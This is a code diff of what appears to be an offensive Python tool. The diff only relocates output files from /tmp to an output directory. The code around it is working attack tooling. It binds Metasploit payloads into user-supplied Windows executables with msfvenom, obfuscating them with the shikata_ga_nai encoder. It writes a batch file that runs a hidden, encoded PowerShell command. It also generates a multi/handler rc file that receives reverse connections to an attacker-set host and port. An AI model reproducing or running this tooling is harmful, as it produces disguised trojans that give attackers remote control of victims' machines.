@@ -23,7 +23,7 @@ def start_listener():
 	PrintInfo("Starting multi handler")
 
 	# create rc file
-	rcfile = "/tmp/bd_listener.rc"
+	rcfile = "output/bd_listener.rc"
 	fw = open(rcfile, "w")
 	fw.write("use exploit/multi/handler\n")
 	fw.write("set PAYLOAD %s\n" % payload)
@@ -76,8 +76,8 @@ while 1:
 		
 		if bdtype == '1':
 			PrintInfo("Binding payload to executeable")
-			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > /tmp/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
-			PrintInfo("Payload /tmp/%s created" % outfile)
+			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 5 -x %s -f exe > output/%s.exe" % (msf_path, payload, ip, port, infile, outfile), shell=True).wait()
+			PrintInfo("Payload output/%s created" % outfile)
 			
 			listener = raw_input("\nStart MSF listener (Y/N):")
 			if listener == 'Y' or listener == '':
@@ -92,7 +92,7 @@ while 1:
 			import src.platforms.powershell as ps
 			
 			x86 = ps.generate_payload(payload, ipaddr, port)
-			x86file = "/tmp/paygen-x86.bat"
+			x86file = "output/paygen-x86.bat"
 			fw = open(x86file, "w")
 			fw.write("@echo off\n")
 			fw.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand %s" % x86)
@@ -100,8 +100,8 @@ while 1:
 			time.sleep(2)
 			
 			PrintInfo("Binding payload to executeable")
-			subprocess.Popen("cat %s | %s/msfvenom -a x86 --platform windows -x %s -f exe -k > /tmp/%s.exe" % (x86file, msf_path, infile, outfile), shell=True).wait()
-			PrintInfo("Payload /tmp/%s created" % outfile)
+			subprocess.Popen("cat %s | %s/msfvenom -a x86 --platform windows -x %s -f exe -k > output/%s.exe" % (x86file, msf_path, infile, outfile), shell=True).wait()
+			PrintInfo("Payload output/%s created" % outfile)
 			
 			listener = raw_input("\nStart MSF listener (Y/N):")
 			if listener == 'Y' or listener == '':
